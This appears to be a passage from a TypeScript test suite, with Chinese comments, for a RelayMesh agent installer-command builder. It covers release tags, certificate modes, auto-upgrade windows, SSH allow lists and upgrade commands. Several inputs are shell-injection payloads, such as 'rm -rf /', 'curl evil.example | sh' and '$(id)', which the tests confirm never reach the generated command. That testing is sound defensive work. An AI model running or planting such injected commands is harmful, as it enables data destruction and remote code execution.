      "v2.0.0'; rm -rf /; echo '",
      'v2.0.0\ncurl evil.example | sh',
      '$(id)',
      '`id`',
      'v2.0.0 && id',
      'v2.0',
      'main',
      'v2.0.0-rc',
      'v2.0.0-RC.1',
      'v2.0.0-rc.1000',
      'v1.6.3-dev-20261020-15e4726',
      ' v2.0.0',
      'v2.0.0 ',
      '../v2.0.0',
      "v2.0.0' -- '",
    ]
    for (const release of bad) {
      for (const os of ['linux', 'windows'] as const) {
        const r = buildInstallCommand(input({ os, release }))
        assert.ok(!r.command.includes('RELAYMESH_VERSION'), `${os} ${JSON.stringify(release)} → ${r.command}`)
        assert.ok(r.command.includes('/RelayMesh/main/install.'), `${os} ${JSON.stringify(release)} → ${r.command}`)
        assert.ok(!r.command.includes('rm -rf') && !r.command.includes('evil'), r.command)
      }
    }
  })

  it('服务端自带来源（hub）时 release 不参与：脚本仍取服务端的，不带 RELAYMESH_VERSION', () => {
    const lx = buildInstallCommand(input({ hub: HUB, release: TAG }))
    assert.deepEqual(lx.errors, [])
    assert.equal(lx.source, 'hub')
    assert.ok(!lx.command.includes('RELAYMESH_VERSION') && lx.command.includes(`/i/${TICKET}/install.sh`), lx.command)
    const win = buildInstallCommand(input({ os: 'windows', hub: HUB, release: TAG }))
    assert.ok(!win.command.includes('RELAYMESH_VERSION') && win.command.includes(`/i/${TICKET}/install.ps1`), win.command)
    assert.ok(!lx.warnings.some(w => w.includes('开发版或版本未知')), '服务端来源不该带「版本未知」提示')
  })

  it('正式版与各种预发布标签都认', () => {
    for (const tag of ['v2.0.0', 'v10.20.30', 'v2.0.0-alpha.1', 'v2.0.0-beta.12', 'v2.0.0-rc.1', 'v2.0.0-rc.999']) {
      const r = buildInstallCommand(input({ release: tag }))
      assert.ok(r.command.includes(`/RelayMesh/${tag}/install.sh`) && r.command.includes(`RELAYMESH_VERSION=${tag} sh`), `${tag} → ${r.command}`)
    }
  })

  it('validReleaseTag / githubInstallerUrl', () => {
    assert.equal(validReleaseTag('v2.0.0-rc.3'), 'v2.0.0-rc.3')
    assert.equal(validReleaseTag('dev'), null)
    assert.equal(validReleaseTag(''), null)
    assert.equal(validReleaseTag(undefined), null)
    assert.equal(validReleaseTag(null), null)
    assert.equal(githubInstallerUrl('linux', 'v2.0.0'), `${RAW}/v2.0.0/install.sh`)
    assert.equal(githubInstallerUrl('macos', 'v2.0.0-rc.3'), `${RAW}/v2.0.0-rc.3/install.sh`)
    assert.equal(githubInstallerUrl('windows', 'v2.0.0-rc.3'), `${RAW}/v2.0.0-rc.3/install.ps1`)
    assert.equal(githubInstallerUrl('linux'), INSTALLER_URL)
    assert.equal(githubInstallerUrl('windows', null), INSTALLER_PS_URL)
    assert.equal(githubInstallerUrl('linux', 'main'), INSTALLER_URL)
  })
})

describe('证书方式的一行结论', () => {
  it('每种方式都有标题与说明；只有明文标记为有风险', () => {
    for (const mode of ['pinned', 'trusted', 'insecure'] as const) {
      assert.ok(CERT_SUMMARY[mode].title.length > 0)
      assert.ok(CERT_SUMMARY[mode].detail.length > 0)
    }
    assert.deepEqual(Object.entries(CERT_SUMMARY).filter(([, v]) => v.risky).map(([k]) => k), ['insecure'])
  })

  it('inferDefault 给出的结论与 inferDefaultTarget 一致，并说明理由', () => {
    const cases: [Parameters<typeof inferDefault>, string][] = [
      [[{ protocol: 'https:', hostname: '10.0.0.2', port: '18776' }, 18776, PIN], '内置 HTTPS 端口'],
      [[{ protocol: 'https:', hostname: 'relay.example.com', port: '' }, 18776, PIN], 'https://relay.example.com'],
      [[{ protocol: 'http:', hostname: '10.0.0.2', port: '18775' }, 18776, PIN], '推荐按证书指纹校验'],
      [[{ protocol: 'http:', hostname: '10.0.0.2', port: '18775' }, null, ''], '只能使用明文'],
    ]
    for (const [args, expectText] of cases) {
      const d = inferDefault(...args)
      assert.ok(d.reason.includes(expectText), `${JSON.stringify(args)} → ${d.reason}`)
      const { reason: _reason, ...plain } = d
      assert.deepEqual(plain, inferDefaultTarget(...args))
    }
  })
})

describe('自动升级的安装选项（--auto-upgrade / --auto-window，默认不碰）', () => {
  const notify = { mode: 'notify' as const }
  const silent = (window = '') => ({ mode: 'silent' as const, window })

  it('默认：命令与警告里都没有自动升级的痕迹', () => {
    for (const autoUpgrade of [undefined, null]) {
      const r = buildInstallCommand(input({ hub: HUB, autoUpgrade }))
      assert.deepEqual(r.errors, [])
      assert.equal(r.command.includes('--auto-'), false, r.command)
      assert.equal(r.warnings.some(w => w.includes('自动升级')), false)
    }
  })

  it('提示模式：Linux 常驻 + 服务端来源，命令末尾多一个 --auto-upgrade notify', () => {
    const r = buildInstallCommand(input({ hub: HUB, autoUpgrade: notify }))
    assert.deepEqual(r.errors, [])
    assert.ok(r.command.includes('agent install --server'), r.command)
    assert.ok(r.command.endsWith(`--pin ${PIN} --auto-upgrade notify`), r.command)
    assert.equal(r.command.includes('--auto-window'), false)
  })

  it('静默模式：时间段写在 --auto-window 里；不限时间段就不写', () => {
    const win = buildInstallCommand(input({ hub: HUB, autoUpgrade: silent('03:00-05:00') }))
    assert.deepEqual(win.errors, [])
    assert.ok(win.command.endsWith('--auto-upgrade silent --auto-window 03:00-05:00'), win.command)
    const cross = buildInstallCommand(input({ hub: HUB, autoUpgrade: silent('23:30-02:15') }))
    assert.ok(cross.command.endsWith('--auto-window 23:30-02:15'), cross.command)
    const any = buildInstallCommand(input({ hub: HUB, autoUpgrade: silent('') }))
    assert.ok(any.command.endsWith('--auto-upgrade silent'), any.command)
    const none = buildInstallCommand(input({ hub: HUB, autoUpgrade: { mode: 'silent' } }))
    assert.ok(none.command.endsWith('--auto-upgrade silent'), none.command)
  })

  it('与其他选项叠加：仅当前用户、网关允许名单、受信任证书；顺序固定在网关选项之后', () => {
    const r = buildInstallCommand(
      input({ hub: HUB, scope: 'user', cert: 'trusted', host: 'relay.example.com', port: null, sshGateway: { enabled: true, allow: ['10.0.0.0/8'] }, autoUpgrade: silent('03:00-05:00') }),
    )
    assert.deepEqual(r.errors, [])
    assert.ok(r.command.includes('agent install --user --server https://relay.example.com'), r.command)
    assert.ok(r.command.endsWith("--ssh-allow 10.0.0.0/8 --auto-upgrade silent --auto-window 03:00-05:00"), r.command)
  })

  it('警告写明：同意在主机本地、随时可收回、Hub 总闸；静默模式还写明验签与时间段', () => {
    const n = buildInstallCommand(input({ hub: HUB, autoUpgrade: notify }))
    const nw = n.warnings.find(w => w.startsWith('自动升级（提示）'))
    assert.ok(nw, n.warnings.join('\n'))
    for (const must of ['不会下载', 'auto-upgrade disable', '总闸']) assert.ok(nw.includes(must), must)
    const s1 = buildInstallCommand(input({ hub: HUB, autoUpgrade: silent('03:00-05:00') }))
    const sw = s1.warnings.find(w => w.startsWith('自动升级（静默）'))
    assert.ok(sw, s1.warnings.join('\n'))
    for (const must of ['03:00-05:00', '验证发布签名', '一律不安装', '自动还原', 'Hub 改不了', 'auto-upgrade disable', '总闸']) assert.ok(sw.includes(must), must)
    const s2 = buildInstallCommand(input({ hub: HUB, autoUpgrade: silent('') }))
    assert.ok(s2.warnings.some(w => w.startsWith('自动升级（静默）') && w.includes('任何时间')), s2.warnings.join('\n'))
  })

  it('只有 Linux + 常驻服务 + 服务端来源可用：macOS / Windows / 临时运行 / GitHub 来源都明确报错，不给命令', () => {
    const cases: [string, Partial<InstallInput>, string][] = [
      ['macOS', { os: 'macos', hub: HUB }, '只有 Linux'],
      ['Windows', { os: 'windows', hub: HUB }, '只有 Linux'],
      ['临时运行', { mode: 'temporary', hub: HUB }, '只有 Linux'],
      ['GitHub 来源', {}, '服务端自带的安装源'],
    ]
    for (const [name, over, expect] of cases) {
      for (const autoUpgrade of [notify, silent('03:00-05:00')]) {
        const r = buildInstallCommand(input({ ...over, autoUpgrade }))
        assert.equal(r.command, '', `${name} ${autoUpgrade.mode}`)
        assert.ok(r.errors.some(e => e.includes(expect)), `${name}: ${r.errors.join('|')}`)
      }
    }
  })

  it('不合规的模式与时间段：报错且不给命令（时间段在这里就挡住，不等到主机上才失败）', () => {
    const bad = (autoUpgrade: object) => buildInstallCommand(input({ hub: HUB, autoUpgrade: autoUpgrade as never }))
    assert.ok(bad({ mode: 'always' }).errors.some(e => e.includes('「提示」或「静默」')))
    assert.ok(bad({ mode: 'notify', window: '03:00-05:00' }).errors.some(e => e.includes('时间段只用于静默升级')))
    for (const window of ['whenever', '3:00-5:00', '24:00-02:00', '03:60-05:00', '03:00-03:00', '03:00', '03:00-05:00; rm -rf /', "03:00-05:00 && echo x"]) {
      const r = bad({ mode: 'silent', window })
      assert.equal(r.command, '', window)
      assert.ok(r.errors.some(e => e.includes('HH:MM-HH:MM')), `${window}: ${r.errors.join('|')}`)
    }
  })

  it('isValidAutoWindow：与 Agent 的 ParseAutoWindow 同一个写法', () => {
    for (const ok of ['', '00:00-23:59', '03:00-05:00', '23:00-02:00', '12:30-12:31']) assert.equal(isValidAutoWindow(ok), true, ok)
    for (const no of [' ', '3:00-05:00', '03:00-5:00', '24:00-01:00', '03:00-03:00', '03:00–05:00', '03:00-05:00 ', 'a']) assert.equal(isValidAutoWindow(no), false, JSON.stringify(no))
  })

  it('升级命令不改服务配置：自动升级选项不参与', () => {
    const r = buildInstallCommand(input({ action: 'upgrade', hub: HUB, autoUpgrade: silent('03:00-05:00') }))
    assert.deepEqual(r.errors, [])
    assert.ok(r.command.includes('agent upgrade'), r.command)
    assert.equal(r.command.includes('--auto-'), false, r.command)
    assert.equal(r.warnings.some(w => w.includes('自动升级')), false)
  })
})

describe('SSH 网关的安装选项（默认开启，只写与默认不同的部分）', () => {
  const on = (allow: string[] = []) => ({ enabled: true, allow })
  const off = { enabled: false, allow: [] as string[] }

  it('默认：命令与警告里都没有网关的痕迹（不写参数就是开）', () => {
    for (const os of ['linux', 'macos', 'windows'] as const) {
      for (const sshGateway of [undefined, null, on()]) {
        const r = buildInstallCommand(input({ os, sshGateway }))
        assert.equal(r.command.includes('ssh'), false, `${os} ${JSON.stringify(sshGateway)}`)
        assert.equal(r.warnings.some(w => w.includes('SSH 网关')), false, os)
      }
    }
  })

  it('取消网关：Linux / macOS / Windows 都只多一个 --no-ssh-gateway', () => {
    const lx = buildInstallCommand(input({ sshGateway: off }))
    assert.deepEqual(lx.errors, [])
    assert.ok(lx.command.endsWith(`--pin ${PIN} --no-ssh-gateway`), lx.command)
    const mac = buildInstallCommand(input({ os: 'macos', scope: 'user', sshGateway: off }))
    assert.ok(mac.command.includes('agent install --user --server'), mac.command)
    assert.ok(mac.command.endsWith('--no-ssh-gateway'), mac.command)
    const cases = [
      ['system', 'install'],
      ['user', 'install --user'],
      ['user-admin', 'install --user --highest'],
    ] as const
    for (const [scope, sub] of cases) {
      const r = buildInstallCommand(input({ os: 'windows', scope, sshGateway: off }))
      assert.deepEqual(r.errors, [], scope)
      assert.ok(r.command.includes(`agent ${sub} --server '${r.serverUrl}' --pin '${PIN}' --no-ssh-gateway`), r.command)
    }
    const hub = buildInstallCommand(input({ hub: HUB, sshGateway: off }))
    assert.ok(hub.command.endsWith(`--pin ${PIN} --no-ssh-gateway`), hub.command)
    // 关闭时说明含义与生效方式，并且命令里不会同时出现允许名单。
    assert.ok(lx.warnings.some(w => w.includes('已关闭 SSH 网关')))
    assert.ok(lx.warnings.some(w => w.includes('holder restart')))
    assert.equal(lx.command.includes('--ssh-allow'), false)
  })

  it('开启并限定目标：每条 --ssh-allow，含 * 的条目加单引号，不再重复默认值 --ssh-gateway', () => {
    const r = buildInstallCommand(input({ sshGateway: on(['10.0.0.0/8', '*.corp.example', 'build-01']) }))
    assert.deepEqual(r.errors, [])
    assert.ok(r.command.endsWith(`--pin ${PIN} --ssh-allow 10.0.0.0/8 --ssh-allow '*.corp.example' --ssh-allow build-01`), r.command)
    assert.equal(r.command.includes('--ssh-gateway'), false)
    const u = buildInstallCommand(input({ os: 'macos', scope: 'user', sshGateway: on(['10.0.0.0/8']) }))
    assert.ok(u.command.endsWith('--ssh-allow 10.0.0.0/8'), u.command)
    for (const [scope, sub] of [['system', 'install'], ['user', 'install --user'], ['user-admin', 'install --user --highest']] as const) {
      const w = buildInstallCommand(input({ os: 'windows', scope, sshGateway: on(['10.0.0.0/8', '*.corp.example']) }))
      assert.deepEqual(w.errors, [], scope)
      assert.ok(w.command.includes(`agent ${sub} --server '${w.serverUrl}' --pin '${PIN}' --ssh-allow '10.0.0.0/8' --ssh-allow '*.corp.example'`), w.command)
    }
    // 服务端自带安装源 + 自签名证书的长命令里同样带上
    const hub = buildInstallCommand(input({ os: 'windows', hub: HUB, sshGateway: on(['10.0.0.0/8']) }))
    assert.deepEqual(hub.errors, [])
    assert.ok(hub.command.includes("--ssh-allow '10.0.0.0/8'"), hub.command)
    const lhub = buildInstallCommand(input({ hub: HUB, sshGateway: on(['10.0.0.0/8']) }))
    assert.ok(lhub.command.endsWith(`--pin ${PIN} --ssh-allow 10.0.0.0/8`), lhub.command)
  })

  it('临时运行不提供网关：默认与取消都静默忽略，只有给了允许名单才报错', () => {
    for (const os of ['linux', 'windows'] as const) {
      for (const sshGateway of [undefined, on(), off]) {
        const r = buildInstallCommand(input({ os, mode: 'temporary', sshGateway }))
        assert.deepEqual(r.errors, [], `${os} ${JSON.stringify(sshGateway)}`)
        assert.equal(r.command.includes('ssh'), false, `${os} ${JSON.stringify(sshGateway)}：临时运行的命令里不该有网关参数`)
      }
      const bad = buildInstallCommand(input({ os, mode: 'temporary', sshGateway: on(['10.0.0.0/8']) }))
      assert.equal(bad.command, '', os)
      assert.ok(bad.errors.some(e => e.includes('常驻')), os)
    }
  })

  it('允许名单的条目按白名单校验：shell 元字符与以 - 开头的条目都不会进入命令', () => {
    for (const bad of ['$(id)', 'a;b', "a'b", 'a b', '`x`', 'a|b', 'a&b', 'a\nb', '-rf', '', '"x"', '../etc', 'a>b', '*'.repeat(300)]) {
      const r = buildInstallCommand(input({ sshGateway: on([bad]) }))
      assert.equal(r.command, '', JSON.stringify(bad))
      assert.ok(r.errors.some(e => e.includes('允许名单')), JSON.stringify(bad))
    }
    for (const good of ['10.0.0.0/8', 'fd00::/8', '::1', '192.168.1.5', 'build-01', '*.corp.example', 'host_1.lan']) {
      assert.deepEqual(buildInstallCommand(input({ sshGateway: on([good]) })).errors, [], good)
    }
    // 关闭网关时不再检查允许名单（它根本不会进入命令）。
    assert.deepEqual(buildInstallCommand(input({ sshGateway: { enabled: false, allow: ['$(id)'] } })).errors, [])
  })

  it('允许名单条目数有上限', () => {
    const many = Array.from({ length: MAX_SSH_ALLOW + 1 }, (_, i) => `10.0.${i}.0/24`)
    const r = buildInstallCommand(input({ sshGateway: on(many) }))
    assert.equal(r.command, '')
    assert.ok(r.errors.some(e => e.includes(String(MAX_SSH_ALLOW))))
    assert.deepEqual(buildInstallCommand(input({ sshGateway: on(many.slice(0, MAX_SSH_ALLOW)) })).errors, [])
  })

  it('提示：只有用户改动了网关才出现——允许名单是唯一边界、已装过 Agent 时需要重启守护进程', () => {
    const limited = buildInstallCommand(input({ sshGateway: on(['10.0.0.0/8']) }))
    assert.ok(limited.warnings.some(w => w.includes('唯一边界')))
    assert.ok(limited.warnings.some(w => w.includes('只保存在这台主机自己的数据目录')))
    assert.ok(limited.warnings.some(w => w.includes('holder restart')))
    const plain = buildInstallCommand(input({ sshGateway: on() }))
    assert.deepEqual(plain.warnings.filter(w => w.includes('holder restart') || w.includes('唯一边界')), [])
  })

  it('parseSshAllow：逗号、空白、换行分隔，去重并保持顺序', () => {
    assert.deepEqual(parseSshAllow('10.0.0.0/8, *.corp.example\n10.0.0.0/8  build-01；fd00::/8'), ['10.0.0.0/8', '*.corp.example', 'build-01', 'fd00::/8'])
    assert.deepEqual(parseSshAllow('  , ;'), [])
    assert.deepEqual(parseSshAllow(''), [])
  })
})

describe('SSH 网关的命令在真实的 sh 里', { skip: process.platform === 'win32' ? '需要 POSIX sh' : false }, () => {
  it('含 * 的条目不会被 shell 展开成当前目录里的文件名，参数逐个原样交给 Agent', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rm-allow-'))
    try {
      writeFileSync(join(dir, 'a.corp.example'), '')
      const r = buildInstallCommand(input({ sshGateway: { enabled: true, allow: ['*.corp.example', '10.0.0.0/8'] } }))
      const marker = 'agent install '
      const args = r.command.slice(r.command.indexOf(marker) + marker.length)
      const out = execFileSync('/bin/sh', ['-c', `set -- ${args}; for a in "$@"; do printf '[%s]' "$a"; done`], { cwd: dir, encoding: 'utf8' })
      assert.equal(out, `[--server][https://192.168.1.10:18776][--pin][${PIN}][--ssh-allow][*.corp.example][--ssh-allow][10.0.0.0/8]`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('升级命令（action = upgrade）', () => {
  const up = (over: Partial<InstallInput> = {}) => buildInstallCommand(input({ action: 'upgrade', hub: HUB, ...over }))

  it('Linux / macOS 系统级：经服务端取脚本，agent upgrade，root 直接运行、普通用户按需 sudo', () => {
    for (const os of ['linux', 'macos'] as const) {
      const r = up({ os })
      assert.deepEqual(r.errors, [])
      assert.equal(r.source, 'hub')
      assert.ok(r.command.startsWith(`curl -fsSL -k --pinnedpubkey '${SPKI}' https://192.168.1.10:18776/i/${TICKET}/install.sh | ${SUDO_IF_NEEDED} sh -s -- agent upgrade `), r.command)
      assert.ok(r.command.endsWith(`--server https://192.168.1.10:18776 --pin ${PIN}`), r.command)
      assert.ok(!r.command.includes('agent install'), '升级不能带安装子命令')
    }
  })

  it('用户级：agent upgrade --user，不加 sudo，并提醒要由安装它的账户执行', () => {
    const r = up({ scope: 'user' })
    assert.ok(r.command.includes(' | sh -s -- agent upgrade --user --server '), r.command)
    assert.ok(!r.command.includes('sudo'))
    assert.ok(r.warnings.some(w => w.includes('安装这个 Agent 的那个账户')))
  })

  it('Windows：系统级 agent upgrade，用户级与「当前用户 + 最高权限」都是 agent upgrade --user', () => {
    const sys = up({ os: 'windows' })
    assert.ok(sys.command.includes(`/i/${TICKET}/install.ps1`), sys.command)
    assert.ok(/ agent upgrade --server 'https:\/\/192\.168\.1\.10:18776' --pin '/.test(sys.command), sys.command)
    assert.ok(sys.warnings.some(w => w.includes('以管理员身份运行')))
    for (const scope of ['user', 'user-admin'] as const) {
      const r = up({ os: 'windows', scope })
      assert.ok(r.command.includes(' agent upgrade --user --server '), r.command)
      assert.ok(!r.command.includes('agent install'))
    }
  })

  it('运行方式与 SSH 网关选项不参与：不会出现 --temp / --ssh-allow / --no-ssh-gateway', () => {
    const r = up({ mode: 'temporary', sshGateway: { enabled: false, allow: [] } })
    assert.deepEqual(r.errors, [])
    assert.ok(!/--temp|--ssh-allow|--no-ssh-gateway/.test(r.command), r.command)
    assert.ok(!r.warnings.some(w => w.includes('SSH 网关') || w.includes('holder restart')))
    // 给了允许名单也不报「临时运行不能设置允许名单」：升级根本不看这些选项
    assert.deepEqual(up({ mode: 'temporary', sshGateway: { enabled: true, allow: ['10.0.0.0/8'] } }).errors, [])
  })

  it('没有服务端来源就不给命令：升级不能退回 GitHub，票据无效也报错', () => {
    const noHub = buildInstallCommand(input({ action: 'upgrade' }))
    assert.equal(noHub.command, '')
    assert.ok(noHub.errors.some(e => e.includes('升级窗口')))
    const bad = up({ hub: { ticket: 'xyz', spki: SPKI } })
    assert.equal(bad.command, '')
    assert.ok(bad.errors.some(e => e.includes('升级票据无效')))
  })

  it('「当前用户 + 最高权限」只适用于 Windows，在 Linux 上选了照旧报错', () => {
    const r = up({ scope: 'user-admin' })
    assert.equal(r.command, '')
    assert.ok(r.errors.some(e => e.includes('仅适用于 Windows')))
  })

  it('证书方式沿用安装命令的写法：明文 HTTP 带 --insecure，受信任证书不带 -k', () => {
    const plain = up({ cert: 'insecure', port: 18775 })
    assert.ok(plain.command.includes('--server http://192.168.1.10:18775 --insecure'), plain.command)
    assert.ok(!plain.command.includes('--pinnedpubkey'))
    const trusted = up({ cert: 'trusted', host: 'relay.example.com', port: null })
    assert.ok(trusted.command.startsWith(`curl -fsSL https://relay.example.com/i/${TICKET}/install.sh | `), trusted.command)
  })

  it('不带 action 时仍是安装命令（升级逻辑不影响现有行为）', () => {
    const r = buildInstallCommand(input({ hub: HUB }))
    assert.ok(r.command.includes('agent install'), r.command)
    assert.ok(!r.command.includes('agent upgrade'))
  })
})
